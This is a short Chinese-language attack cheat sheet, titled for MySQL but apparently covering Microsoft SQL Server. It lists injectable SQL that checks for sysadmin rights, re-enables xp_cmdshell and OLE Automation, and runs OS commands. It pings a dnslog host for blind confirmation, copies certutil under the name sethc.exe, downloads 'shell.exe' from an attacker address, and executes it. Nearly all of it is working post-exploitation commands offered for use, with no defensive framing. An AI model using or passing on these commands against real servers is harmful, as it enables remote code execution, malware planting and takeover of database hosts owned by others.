# mysql_root

---

判断权限(是否sa)

```
1=(select is_srvrolemember('sysadmin'))
host_name()!=@@servername
```

1.开启xp_cmdshell（1开启，0关闭）

```
EXEC sp_configure 'show advanced options',1 RECONFIGURE EXEC sp_configure 'xp_cmdshell',1 RECONFIGURE;
```

执行命令

```
exec master..xp_cmdshell "whoami"
```

如报错：未能找到存储过程 'master..xp_cmdshell'

```
EXEC sp_addextendedproc xp_cmdshell,@dllname ='xplog70.dll'declare @o int
sp_addextendedproc 'xp_cmdshell','xpsql70.dll'
```



2.开启sp_oacreate

```
exec sp_configure 'show advanced options', 1;  RECONFIGURE;  exec sp_configure 'Ole Automation Procedures', 1;  RECONFIGURE;
```

sp_oacreate执行命令无回显，需要使用dnslog平台进行判断

```
Declare @runshell INT Exec SP_OACreate 'wscript.shell',@runshell out Exec SP_OAMeTHOD @runshell,'run',null,'ping who.xxxx.dnslog.cn';
```
将certutil复制导temp下

```
declare @o int exec sp_oacreate 'scripting.filesystemobject', @o out exec sp_oamethod @o,'copyfile',null,'C:\Windows\System32\certutil.exe' ,'c:\windows\temp\sethc.exe';
```

利用certutil传马

```
declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'C:\Windows\Temp\sethc.exe -urlcache -split -f "http://ip:port/shell.exe" C:\Windows\Temp\shell.exe'
```
运行
```
Declare @runshell INT Exec SP_OACreate 'wscript.shell',@runshell out Exec SP_OAMeTHOD @runshell,'run',null,'forfiles /c shell.exe';
```